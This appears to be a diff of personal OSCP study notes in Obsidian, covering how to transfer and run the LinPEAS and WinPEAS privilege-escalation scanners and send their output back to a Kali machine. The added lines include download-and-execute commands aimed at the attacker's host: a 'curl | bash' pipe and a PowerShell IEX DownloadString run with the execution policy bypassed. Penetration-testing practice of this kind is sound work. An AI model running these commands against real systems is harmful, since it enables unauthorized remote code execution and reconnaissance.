@@ -5,7 +5,7 @@ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
 ```
 
 ```
-cd ~/Desktop/Tools && python3 -m http.server 8888
+cd~/Desktop/Tools/LinPEAS && python3 -m http.server 8888
 ```
 
 Directly execute into bash without downloading anyt
@@ -20,12 +20,12 @@ or
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `cd /tmp && wget http://${KaliIP}:8888/linpeas.sh`;
+const command = `cd /tmp && wget http://${KaliIP}:8888/linpeas.sh && wget http://${KaliIP}:8888/parsePEASS.sh`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
 ```
-chmod +x ./linpeas.sh && ./linpeas.sh
+chmod +x ./linpeas.sh && chmod +x parsePEASS.sh && ./linpeas.sh
 ```
 
 ---
@@ -42,26 +42,44 @@ winPEASx64.exe
 
 ---
 
-## Serve Output in Web Browser
+## Serve Output in Web Browser | ParsePEAS
 
-Perfect capture
+### On Kali Host
 ```
-script -q -c "./linpeas.sh" linpeas.txt && python3 -m http.server 8000
-```
-
-Alt Method
-
-```
-./linpeas.sh | tee -a linpeas.txt && python3 -m http.server 8000
+cd ~/Desktop/Tools/ParsingPeas && python3 -m venv .venv && source .venv/bin/activate && pip3 install -r requirements.txt && python3 receiver.py
 ```
 
-Visit on browser
+### On Target Machine
+
+**Linux/Unix:**
 ```dataviewjs
-const page = dv.page("Synced OSCP Notes/Top/Active Notes");const ip = page?.IP ?? "NO IP FOUND";
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `http://${ip}:8000/linpeas.txt`;
+const command = `cd /tmp && curl -sSL http://${KaliIP}:8000/get-script | bash`;
 
 dv.paragraph("```bash\n" + command + "\n```");
+```
+**Windows (PowerShell):**
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://${KaliIP}:8000/wrapper-inline.ps1')"`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
+On MY KALI attacker, navigate to 
+```dataviewjs
+const page = dv.page("Synced OSCP Notes/Top/Active Notes");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
+
+const command = `http://${KaliIP}:8000`;
+
+dv.paragraph("```bash\n" + command + "\n```");
+```
+
+
+---
+
 ```
 ---
 
